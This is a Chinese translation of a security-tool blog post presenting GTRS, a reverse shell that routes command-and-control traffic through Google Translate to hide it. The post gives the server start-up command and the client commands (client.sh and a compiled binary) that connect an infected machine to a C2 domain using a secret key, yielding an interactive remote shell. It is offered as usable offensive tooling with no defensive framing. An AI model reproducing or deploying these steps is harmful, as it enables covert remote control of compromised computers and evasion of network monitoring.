# GTRS–谷歌翻译反向外壳 2018

> 原文：<https://kalilinuxtutorials.com/gtrs-google-translator-reverse-shell/>

GTRS tools 使用 [Google Translator](https://translate.google.com/) 作为代理向受感染的机器发送任意命令。

```
[INFECTED MACHINE] ==HTTPS==> [GOOGLE TRANSLATE] ==HTTP==> [C2]
```

## **GTRS 环境配置**

首先你需要一个 VPS 和一个域名

## **GTRS 服务器**

在 VPS 上启动 server.py

```
python2.7 server.py
Server running on port: 80
Secret Key: e294a11e-bb6f-49ed-b03a-9ec42be55062
```

它将为您提供将在客户端使用的密钥。

**也读作[Mcreator——编码反向外壳生成器，具有绕过 AV 的](https://kalilinuxtutorials.com/mcreator-encoded-reverse-shell-generator/)** 的技术

## **客户狂欢**

在能够访问 [Google Translator](https://translate.google.com/) 的计算机上运行客户端，提供域和服务器生成的密钥。

```
bash client.sh www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
```

现在你有了一个使用命名管道文件的交互式外壳，**是的**你可以`cd`进入目录。

## **客户端运行**

您首先需要下载或编译二进制文件，然后这个过程相当于 bash 客户端，

```
./client_Linux www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
```

有了这个客户端，你可以在 Linux、Mac 和 Windows 上运行它，但是客户端还没有交互式外壳。

## **视频教程**

[https://www.youtube.com/embed/02CFsE0k96E?feature=oembed](https://www.youtube.com/embed/02CFsE0k96E?feature=oembed)

[![](img/d861a9096555aeb1980fc054015933d7.png) ](https://github.com/mthbernardes/GTRS) ** *您可以在 [Linkedin](https://www.linkedin.com/company/gbhackers/) 、 [Twitter](https://twitter.com/GbhackerOn) 、[脸书](https://www.facebook.com/gbhackersadmin)上关注我们的日常网络安全更新，您还可以在线参加[最佳网络安全课程](https://ethicalhackersacademy.com/)以保持自我更新。***